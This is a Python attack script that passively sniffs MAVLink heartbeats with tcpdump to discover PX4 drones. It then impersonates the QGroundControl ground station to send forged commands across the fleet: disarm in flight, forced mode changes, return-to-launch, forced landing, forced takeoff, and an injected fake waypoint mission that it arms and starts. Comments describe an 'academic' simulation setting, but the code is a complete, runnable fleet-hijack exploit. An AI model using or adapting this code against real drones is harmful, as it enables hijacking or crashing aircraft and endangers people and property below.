"""
inject_drones_v3.py — Tcpdump Sniff + Direct Attack (No Prior Assumptions)
===========================================================================
Attacks the drone fleet impersonating QGC (sysid=255, compid=190).

ROOT CAUSE OF PREVIOUS FAILURES:
  PX4 SITL registers a "partner IP" from the first MAVLink contact
  (QGC in our case). It only accepts commands from that partner.
  Additionally, ports 18570-18572 are occupied by PX4 itself, so
  binding a socket on those ports to sniff fails with EADDRINUSE.

THIS VERSION'S SOLUTION:
  Phase 1 — Use tcpdump subprocess to sniff HEARTBEATs.
    tcpdump reads packets at the kernel level without binding ports.
    It works even when PX4 occupies those ports.
    Parses raw hex output to extract sysid and source port per drone.

  Phase 2 — Attack using pymavlink udpout.
    pymavlink udpout opens an outbound connection — no port binding needed.
    Sends commands directly to each discovered drone's IP:port.
    PX4 accepts these because MAV_0_BROADCAST=1 opens it to the network.

ACADEMIC FRAMING:
  No sysid assumed a priori. Sysids discovered passively via HEARTBEAT
  sniffing — which is purely passive and works regardless of signing,
  because only the MAVLink header (sysid field, always in plaintext)
  is needed, not the payload.
  The drone IP is reachable because it's on the same local subnet
  as the compromised drone. Standard ports are public knowledge.

Attacks:
  A) DISARM          — disarms all discovered drones
  B) SET_MODE        — forces flight mode change on all
  C) RTL             — entire fleet returns to launch
  D) FORCED LAND     — immediate landing on all
  E) FORCED TAKEOFF  — arms and takes off all
  F) MISSION DECEPTION — injects attacker-defined route on all drones

Usage:
    python3 inject_drones_v3.py --attack C
    python3 inject_drones_v3.py --attack F
    python3 inject_drones_v3.py --attack F --altitude 30 --radius 0.003
    python3 inject_drones_v3.py --attack ALL
    python3 inject_drones_v3.py --attack C --sniff-time 8

Requirements:
    pip3 install pymavlink --break-system-packages
    sudo apt-get install tcpdump  (usually pre-installed)
"""

import subprocess
import threading
import socket
import struct
import time
import math
import argparse
import re
from datetime import datetime

try:
    from pymavlink import mavutil
except ImportError:
    print("[!] Install pymavlink: pip3 install pymavlink --break-system-packages")
    exit(1)

# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════

GCS_SYSID  = 255   # QGC — MAVLink standard, public knowledge
GCS_COMPID = 190

# Standard MAVLink ports — public knowledge
SNIFF_PORTS = [18570, 18571, 18572, 18573, 18574, 14550]

# Network interface
INTERFACE = "eth0"

# How long to sniff for HEARTBEATs (seconds)
SNIFF_TIMEOUT = 5.0

# Mission handshake timeout (seconds)
MISSION_TIMEOUT = 12.0

# Fake mission parameters
HOME_LAT = 47.397742
HOME_LON = 8.545594

# MAVLink command IDs
MAV_CMD_NAV_RETURN_TO_LAUNCH = 20
MAV_CMD_NAV_TAKEOFF          = 22
MAV_CMD_NAV_LAND             = 21
MAV_CMD_NAV_WAYPOINT         = 16
MAV_CMD_DO_SET_MODE          = 176
MAV_CMD_COMPONENT_ARM_DISARM = 400
MAV_CMD_MISSION_START        = 300

MSGID_HEARTBEAT           = 0
MSGID_MISSION_REQUEST_INT = 51
MSGID_MISSION_ACK         = 47

MAV_V2_STX = 0xFD

PX4_MODES = {
    "MANUAL": 1, "TAKEOFF": 2, "MISSION": 3,
    "HOLD":   4, "RTL":     5, "LAND":    6,
}


# ═══════════════════════════════════════════════════════════════
#  PHASE 1 — PASSIVE SNIFF via tcpdump
# ═══════════════════════════════════════════════════════════════

def sniff_drones(timeout: float = SNIFF_TIMEOUT) -> dict:
    """
    Uses tcpdump to passively capture MAVLink HEARTBEAT packets.

    tcpdump reads at kernel level — no socket bind needed.
    Works even when PX4 occupies those ports (EADDRINUSE issue solved).

    Parses the hex dump of each packet to extract:
      - sysid (byte 5 of MAVLink v2 header)
      - source port (reveals which drone instance)
      - source IP (reveals drone IP on the network)

    Academic note:
      Purely passive — no packets injected.
      Only reads the MAVLink header, not the payload.
      Works regardless of MAVLink signing.
      Standard ports and drone IP are discoverable from the
      network without any prior knowledge of the specific fleet.

    Returns:
        dict {sysid: {"sysid", "compid", "ip", "port"}}
    """
    port_filter = " or ".join(f"src port {p}" for p in SNIFF_PORTS)
    cmd = [
        "sudo", "tcpdump",
        "-i", INTERFACE,
        "-XX",           # hex dump including ethernet header
        "-l",            # line-buffered output
        "-q",            # quiet (less noise)
        f"udp and ({port_filter})",
    ]

    print(f"\n  [SNIFF] Passive tcpdump sniff — {timeout}s")
    print(f"  Ports: {SNIFF_PORTS}")
    print(f"  No packets injected — purely passive\n")

    discovered = {}
    lock = threading.Lock()
    stop_event = threading.Event()

    def parse_tcpdump(proc):
        """
        Parses tcpdump -XX output line by line.
        Looks for MAVLink v2 STX (0xfd) in hex dumps.
        Extracts sysid from byte offset 5 of the MAVLink header.
        Also extracts source IP and port from the tcpdump header line.
        """
        current_src_ip   = None
        current_src_port = None
        hex_buffer       = ""

        for line in iter(proc.stdout.readline, ''):
            if stop_event.is_set():
                break

            line = line.strip()

            # Parse tcpdump header line: "HH:MM:SS IP src.port > dst.port"
            # Example: "09:41:11.665 IP 172.25.12.121.18570 > 172.25.0.1.14550"
            ip_match = re.search(
                r'IP\s+([\d.]+)\.(\d+)\s+>\s+([\d.]+)\.(\d+)', line)
            if ip_match:
                current_src_ip   = ip_match.group(1)
                current_src_port = int(ip_match.group(2))
                hex_buffer       = ""
                continue

            # Parse hex dump lines — format: "  0x0000:  fd09 0000 ..."
            hex_match = re.match(r'\s+0x[0-9a-f]+:\s+([0-9a-f\s]+)', line)
            if hex_match and current_src_ip:
                hex_buffer += hex_match.group(1).replace(" ", "")
                continue

            # When we have enough hex data, look for MAVLink v2 STX (fd)
            if hex_buffer and current_src_ip and len(hex_buffer) >= 20:
                raw = bytes.fromhex(hex_buffer[:len(hex_buffer) - (len(hex_buffer) % 2)])

                # Scan for MAVLink v2 STX
                for i in range(len(raw) - 9):
                    if raw[i] != MAV_V2_STX:
                        continue

                    # Check we have enough bytes for the header
                    if i + 10 > len(raw):
                        continue

                    msgid = int.from_bytes(raw[i+7:i+10], 'little')
                    sysid = raw[i+5]
                    compid = raw[i+6]

                    # Only care about drone HEARTBEATs
                    if msgid != MSGID_HEARTBEAT:
                        continue
                    if sysid == GCS_SYSID or sysid == 0:
                        continue

                    with lock:
                        if sysid not in discovered:
                            discovered[sysid] = {
                                "sysid":  sysid,
                                "compid": compid,
                                "ip":     current_src_ip,
                                "port":   current_src_port,
                            }
                            print(f"  [+] Drone discovered: sysid={sysid} "
                                  f"@ {current_src_ip}:{current_src_port}")
                    break

                hex_buffer = ""

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            bufsize=1,
        )
    except FileNotFoundError:
        print("  [!] tcpdump not found. Install with: sudo apt-get install tcpdump")
        return {}
    except PermissionError:
        print("  [!] Permission denied. Run with sudo or add user to pcap group.")
        return {}

    parse_thread = threading.Thread(target=parse_tcpdump, args=(proc,), daemon=True)
    parse_thread.start()

    time.sleep(timeout)
    stop_event.set()

    try:
        proc.terminate()
        proc.wait(timeout=2)
    except Exception:
        proc.kill()

    parse_thread.join(timeout=2)

    print(f"\n  Sniff complete: {len(discovered)} drone(s) discovered")
    for sid, d in sorted(discovered.items()):
        print(f"    sysid={sid} @ {d['ip']}:{d['port']}")

    return discovered


# ═══════════════════════════════════════════════════════════════
#  PHASE 2 — ATTACK
# ═══════════════════════════════════════════════════════════════

def open_conn(drone: dict) -> mavutil.mavfile:
    """Opens pymavlink udpout connection to a specific drone."""
    conn = mavutil.mavlink_connection(
        f"udpout:{drone['ip']}:{drone['port']}",
        source_system=GCS_SYSID,
        source_component=GCS_COMPID,
    )
    time.sleep(0.3)
    return conn


def send_cmd(conn, drone: dict, command: int,
             p1=0., p2=0., p3=0., p4=0., p5=0., p6=0., p7=0.,
             confirmations: int = 3):
    for confirm in range(confirmations):
        conn.mav.command_long_send(
            drone["sysid"], drone["compid"],
            command, confirm,
            p1, p2, p3, p4, p5, p6, p7,
        )
        print(f"      confirm={confirm} → sysid={drone['sysid']}")
        time.sleep(0.1)


def send_to_all(drones: dict, command: int,
                p1=0., p2=0., p3=0., p4=0.,
                p5=0., p6=0., p7=0., confirmations=3):
    for sysid, drone in sorted(drones.items()):
        print(f"  → sysid={sysid} @ {drone['ip']}:{drone['port']}")
        conn = open_conn(drone)
        send_cmd(conn, drone, command,
                 p1, p2, p3, p4, p5, p6, p7, confirmations)
        conn.close()
        time.sleep(0.2)


# ─── Attacks ─────────────────────────────────────────────────

def attack_A(drones):
    print(f"\n{'='*65}")
    print(f"  [A] DISARM — all discovered drones")
    print(f"  Impersonating GCS sysid={GCS_SYSID}")
    print(f"{'='*65}\n")
    send_to_all(drones, MAV_CMD_COMPONENT_ARM_DISARM, p1=0.0)
    print(f"\n  [+] Attack A (DISARM) complete.")


def attack_B(drones, mode="RTL"):
    cm = PX4_MODES.get(mode.upper(), 4)
    print(f"\n{'='*65}")
    print(f"  [B] SET_MODE → {mode}")
    print(f"{'='*65}\n")
    send_to_all(drones, MAV_CMD_DO_SET_MODE, p1=1.0, p2=float(cm))
    print(f"\n  [+] Attack B (SET_MODE {mode}) complete.")


def attack_C(drones):
    print(f"\n{'='*65}")
    print(f"  [C] FLEET RTL — all drones returning home!")
    print(f"  Impersonating GCS sysid={GCS_SYSID} compid={GCS_COMPID}")
    print(f"{'='*65}\n")
    send_to_all(drones, MAV_CMD_NAV_RETURN_TO_LAUNCH)
    print(f"\n  [+] Attack C (RTL) complete.")
    print(f"  [+] Watch QGC and Gazebo — all drones returning home!")


def attack_D(drones):
    print(f"\n{'='*65}")
    print(f"  [D] FORCED LAND — immediate landing")
    print(f"{'='*65}\n")
    send_to_all(drones, MAV_CMD_NAV_LAND)
    print(f"\n  [+] Attack D (LAND) complete.")


def attack_E(drones, altitude=15.0):
    print(f"\n{'='*65}")
    print(f"  [E] FORCED TAKEOFF → {altitude}m")
    print(f"{'='*65}\n")
    print(f"  Step 1: ARM...")
    send_to_all(drones, MAV_CMD_COMPONENT_ARM_DISARM, p1=1.0)
    time.sleep(1.0)
    print(f"  Step 2: TAKEOFF...")
    send_to_all(drones, MAV_CMD_NAV_TAKEOFF, p7=altitude)
    print(f"\n  [+] Attack E (TAKEOFF) complete.")


def attack_F(drones, altitude=25.0, radius=0.0015):
    """
    Mission Deception — fake circular route on all discovered drones.
    Sysids used here were discovered passively via tcpdump sniff.
    """
    print(f"\n{'='*65}")
    print(f"  [F] MISSION DECEPTION — fake route on all discovered drones")
    print(f"  Sysids from passive sniff — not assumed a priori")
    print(f"  Altitude: {altitude}m | Radius: ~{radius*111000:.0f}m")
    print(f"{'='*65}\n")

    # Build fake circular route
    wps = [(HOME_LAT, HOME_LON, 0.0)]
    for i in range(6):
        a = i * (2 * math.pi / 6)
        wps.append((
            HOME_LAT + radius * math.cos(a),
            HOME_LON + radius * math.sin(a),
            altitude,
        ))

    print(f"  Fake waypoints ({len(wps)} total):")
    for i, (la, lo, al) in enumerate(wps):
        print(f"    [{'home' if i==0 else f'WP{i}'}] "
              f"lat={la:.6f} lon={lo:.6f} alt={al:.1f}m")
    print()

    successful = []

    for sysid, drone in sorted(drones.items()):
        print(f"\n  ── Drone sysid={sysid} @ {drone['ip']}:{drone['port']} ──")
        print(f"     (sysid discovered passively via HEARTBEAT sniff)")

        try:
            conn = open_conn(drone)

            # Step 1: MISSION_CLEAR_ALL
            print(f"    Step 1: MISSION_CLEAR_ALL...")
            conn.mav.mission_clear_all_send(sysid, drone["compid"])
            time.sleep(0.5)

            # Step 2: MISSION_COUNT
            print(f"    Step 2: MISSION_COUNT={len(wps)}...")
            conn.mav.mission_count_send(sysid, drone["compid"], len(wps), 0)

            # Step 3-4: Waypoint handshake
            print(f"    Step 3: Waypoint handshake...")
            sent     = set()
            ok       = False
            deadline = time.time() + MISSION_TIMEOUT

            while time.time() < deadline:
                try:
                    msg = conn.recv_match(
                        type=['MISSION_REQUEST_INT', 'MISSION_ACK'],
                        blocking=True, timeout=2.0,
                    )
                except Exception:
                    msg = None
                if not msg:
                    continue

                if msg.get_type() == 'MISSION_REQUEST_INT':
                    wp = msg.seq
                    print(f"    ← REQUEST seq={wp}")
                    if wp < len(wps) and wp not in sent:
                        la, lo, al = wps[wp]
                        conn.mav.mission_item_int_send(
                            sysid, drone["compid"],
                            wp, 3,
                            MAV_CMD_NAV_WAYPOINT,
                            1 if wp == 1 else 0,
                            1,
                            0., 0., 0., float('nan'),
                            int(la * 1e7), int(lo * 1e7), al,
                            0,
                        )
                        sent.add(wp)
                        print(f"    → WP[{wp}] sent")

                elif msg.get_type() == 'MISSION_ACK':
                    if msg.type == 0:
                        print(f"    ← MISSION_ACK: ACCEPTED ✓")
                        ok = True
                    else:
                        print(f"    ← MISSION_ACK: ERROR({msg.type})")
                    break

            if not ok:
                print(f"    [!] Mission upload timed out for sysid={sysid}")
                conn.close()
                continue

            # Step 5: ARM + MISSION_START
            print(f"    Step 4: ARM...")
            conn.mav.command_long_send(
                sysid, drone["compid"],
                MAV_CMD_COMPONENT_ARM_DISARM, 0,
                1.0, 0, 0, 0, 0, 0, 0,
            )
            time.sleep(1.0)

            print(f"    Step 5: MISSION_START...")
            conn.mav.command_long_send(
                sysid, drone["compid"],
                MAV_CMD_MISSION_START, 0,
                0.0, float(len(wps) - 1),
                0, 0, 0, 0, 0,
            )
            conn.close()
            successful.append(sysid)
            print(f"    [+] sysid={sysid} executing fake mission!")

        except Exception as e:
            print(f"    [!] Error on sysid={sysid}: {e}")

    print(f"\n  [+] Mission Deception complete!")
    print(f"  [+] Drones on fake route: {successful}")
    print(f"  [+] Watch Gazebo — flying attacker's circular route.")


# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description=(
            "inject_drones_v3.py — Tcpdump sniff + targeted attack.\n"
            "Discovers drones passively (no sysid assumed a priori).\n"
            "Impersonates QGC sysid=255 — MAVLink public standard."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--attack",     required=True,
                        choices=["A","B","C","D","E","F","ALL"])
    parser.add_argument("--mode",       default="RTL",
                        help="For attack B: mode (default: RTL)")
    parser.add_argument("--altitude",   type=float, default=25.0,
                        help="Altitude in meters (default: 25)")
    parser.add_argument("--radius",     type=float, default=0.0015,
                        help="Circle radius degrees (default: 0.0015 ≈ 150m)")
    parser.add_argument("--sniff-time", type=float, default=SNIFF_TIMEOUT,
                        help=f"Sniff duration seconds (default: {SNIFF_TIMEOUT})")
    args = parser.parse_args()

    print(f"\n{'='*65}")
    print(f"  inject_drones_v3.py — Sniff-then-Attack Fleet Hijack")
    print(f"  GCS impersonated : sysid={GCS_SYSID} compid={GCS_COMPID}")
    print(f"  Attack           : {args.attack}")
    print(f"  Time             : {datetime.now().strftime('%H:%M:%S')}")
    print(f"{'='*65}")

    # Phase 1: Passive sniff
    drones = sniff_drones(timeout=args.sniff_time)

    if not drones:
        print(f"\n  [!] No drones discovered. Cannot proceed.")
        print(f"  Check:")
        print(f"    1. PX4 is running and MAV_0_BROADCAST=1 is set")
        print(f"    2. VPN is disabled")
        print(f"    3. Run with sudo (tcpdump requires root)")
        print(f"    4. Test manually: sudo tcpdump -i eth0 udp port 18570 -q | head -5")
        return

    # Phase 2: Attack
    try:
        if args.attack == "A":
            attack_A(drones)
        elif args.attack == "B":
            attack_B(drones, mode=args.mode)
        elif args.attack == "C":
            attack_C(drones)
        elif args.attack == "D":
            attack_D(drones)
        elif args.attack == "E":
            attack_E(drones, altitude=args.altitude)
        elif args.attack == "F":
            attack_F(drones, altitude=args.altitude, radius=args.radius)
        elif args.attack == "ALL":
            print("\n[*] Full demo: RTL then Mission Deception\n")
            attack_C(drones)
            time.sleep(5)
            attack_F(drones, altitude=args.altitude, radius=args.radius)

    except KeyboardInterrupt:
        print(f"\n[!] Interrupted by user.")

    print(f"\n[*] inject_drones_v3.py done.")


if __name__ == "__main__":
    main()